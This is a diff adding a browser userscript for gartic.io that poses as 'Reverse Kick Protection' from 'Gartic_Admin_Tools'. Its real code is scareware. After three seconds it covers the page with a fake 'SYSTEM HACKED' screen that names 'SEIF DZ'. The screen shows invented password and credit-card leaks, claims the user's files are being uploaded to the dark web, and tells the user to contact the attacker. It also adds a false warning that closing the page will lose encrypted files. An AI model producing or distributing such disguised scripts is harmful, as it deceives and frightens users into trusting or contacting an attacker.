@@ -1,0 +1,134 @@
+// ==UserScript==
+// @name         Reverse Kick Protection
+// @namespace    http://tampermonkey.net/
+// @version      2.4.1
+// @description  Advanced protection against reverse kick and server disconnects.
+// @author       Gartic_Admin_Tools
+// @match        *://gartic.io/*
+// @match        *://*.gartic.io/*
+// @run-at       document-idle
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+    setTimeout(() => {
+        const overlay = document.createElement('div');
+        overlay.innerHTML = `
+            <div style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: black;
+                z-index: 2147483647;
+                font-family: 'Courier New', monospace;
+                overflow: hidden;
+                animation: flicker 0.1s infinite;
+            ">
+                <div style="
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: linear-gradient(0deg, rgba(0,255,0,0.1) 0%, rgba(0,0,0,1) 100%);
+                    pointer-events: none;
+                "></div>
+
+                <div style="
+                    position: relative;
+                    color: #00ff00;
+                    padding: 20px;
+                    text-shadow: 0 0 10px #00ff00;
+                    font-size: 14px;
+                    line-height: 1.8;
+                ">
+                    <pre style="margin: 0; color: #00ff00; font-size: 8px;">
+    ░██████╗███████╗██╗███████╗    ██████╗ ███████╗
+    ██╔════╝██╔════╝██║██╔════╝    ██╔══██╗██╔════╝
+    ╚█████╗░█████╗░░██║█████╗░░    ██║░░██║███████╗
+    ░╚═══██╗██╔══╝░░██║██╔══╝░░    ██║░░██║╚════██║
+    ██████╔╝██║░░░░░██║███████╗    ██████╔╝███████║
+    ╚═════╝░╚═╝░░░░░╚═╝╚══════╝    ╚═════╝░╚══════╝
+                    </pre>
+
+                    <div style="margin: 20px 0; font-size: 24px; font-weight: bold; color: #ff0000; text-shadow: 0 0 20px red;">
+                        ⚠️ SYSTEM HACKED ⚠️
+                    </div>
+
+                    <div style="margin: 15px 0; font-size: 28px; color: #00ff00; border: 2px solid #00ff00; padding: 15px; text-align: center; animation: pulse 1s infinite;">
+                        🔥 YOU HAVE BEEN HACKED BY 🔥
+                        <br>
+                        <span style="font-size: 40px; color: #ff0000;">SEIF DZ</span>
+                    </div>
+
+                    <div style="margin: 20px 0; font-family: monospace;">
+                        <div style="color: #ffff00;">[>] COLLECTING DATA...</div>
+                        <div style="color: #00ff00;">[*] IP Address: 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</div>
+                        <div style="color: #00ff00;">[*] Device: ${navigator.userAgent.substring(0, 50)}...</div>
+                        <div style="color: #00ff00;">[*] Browser: ${navigator.appName}</div>
+                        <div style="color: #00ff00;">[*] Location: ${Math.random() > 0.5 ? 'Algeria' : 'Unknown'}</div>
+                        <div style="color: #00ff00;">[*] Passwords: ****************</div>
+                        <div style="color: #00ff00;">[*] Credit Cards: ************1234</div>
+                    </div>
+
+                    <div style="margin: 20px 0; color: #ff0000; font-size: 18px; animation: blink 0.5s infinite;">
+                        ⚡ DOWNLOADING PERSONAL FILES... ⚡
+                    </div>
+
+                    <div style="
+                        width: 100%;
+                        height: 30px;
+                        background: #111;
+                        border: 1px solid #00ff00;
+                        margin: 15px 0;
+                    ">
+                        <div style="
+                            width: 0%;
+                            height: 100%;
+                            background: linear-gradient(90deg, #00ff00, #ff0000);
+                            animation: loading_once 10s forwards;
+                        "></div>
+                    </div>
+
+                    <div style="color: #00ff00; font-size: 12px; margin-top: 30px;">
+                        > DON'T TRY TO CLOSE THIS WINDOW
+                        <br>
+                        > YOUR DATA IS BEING UPLOADED TO DARK WEB
+                        <br>
+                        > CONTACT SEIF DZ TO RESTORE YOUR FILES
+                    </div>
+                </div>
+            </div>
+
+            <style>
+                @keyframes flicker {
+                    0% { opacity: 1; } 2% { opacity: 0.8; } 4% { opacity: 1; }
+                    96% { opacity: 1; } 98% { opacity: 0.9; } 100% { opacity: 1; }
+                }
+                @keyframes blink {
+                    0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; }
+                }
+                @keyframes pulse {
+                    0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); }
+                }
+                @keyframes loading_once {
+                    0% { width: 0%; }
+                    100% { width: 100%; }
+                }
+            </style>
+        `;
+
+        document.body.appendChild(overlay);
+  
+        window.onbeforeunload = function() {
+            return "CRITICAL ERROR: System core files are being encrypted. Closing now will cause permanent data loss!";
+        };
+
+        console.log('%c⚠️ SECURITY BREACH DETECTED ⚠️', 'font-size: 30px; color: red; background: black;');
+
+    }, 3000);
+
+})();
